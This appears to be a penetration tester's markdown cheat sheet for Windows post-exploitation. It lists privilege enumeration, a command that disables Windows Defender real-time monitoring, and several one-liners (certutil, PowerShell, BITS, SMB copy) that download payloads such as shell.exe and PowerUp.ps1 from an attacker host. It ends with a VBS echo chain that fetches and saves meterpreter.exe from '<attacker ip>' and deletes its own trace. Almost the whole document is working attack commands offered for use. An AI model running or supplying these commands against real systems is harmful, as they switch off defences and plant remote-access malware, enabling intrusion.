# Enum
whoami /priv  

## Powershell
Get-ExecutionPolicy    
Set-ExecutionPolicy Unrestricted   
Set-MpPreference -DisableRealtimeMonitoring $true  

## Kernel exploits   
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"   


# File Transfer  
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .   
copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe   

certutil.exe -urlcache -split -f "http://$IP/file.bat" file.bat   
  
## Powershell
powershell -c wget "http://$IP/file.exe" -outfile "file.exe"   
powershell "(New-Object System.Net.WebClient).DownloadFile('$IP','$PORT')"   
powershell Invoke-WebRequest -Uri http://$IP:$PORT/PowerUp.ps1 -OutFile C:\Users\out   
BITS (Background Intelligence Transfer Service)   
powershell Import-Module BitsTransfer;Start-BitsTransfer -Source http://$IP:$PORT/file.bat -Destination C:\   

## VBS 
echo Set o=CreateObject^("MSXML2.XMLHTTP"^):Set a=CreateObject^("ADODB.Stream"^):Set f=Createobject^("Scripting.FileSystemObject"^):o.open "GET", "http://<attacker ip>/meterpreter.exe", 0:o.send^(^):If o.Status=200 Then > "C:\temp\download.vbs" &echo a.Open:a.Type=1:a.Write o.ResponseBody:a.Position=0:If f.Fileexists^("C:\temp\meterpreter.exe"^) Then f.DeleteFile "C:\temp\meterpreter.exe" >> "C:\temp\download.vbs" &echo a.SaveToFile "C:\temp\meterpreter.exe" >>"C:\temp\download.vbs" &echo End if >>"C:\temp\download.vbs" &cscript //B "C:\temp\download.vbs" &del /F /Q "C:\temp\download.vbs"

 
  
# Resources
## Cheat Sheets
  https://burmat.gitbook.io/security/hacking/one-liners-and-dirty-scripts
  
  
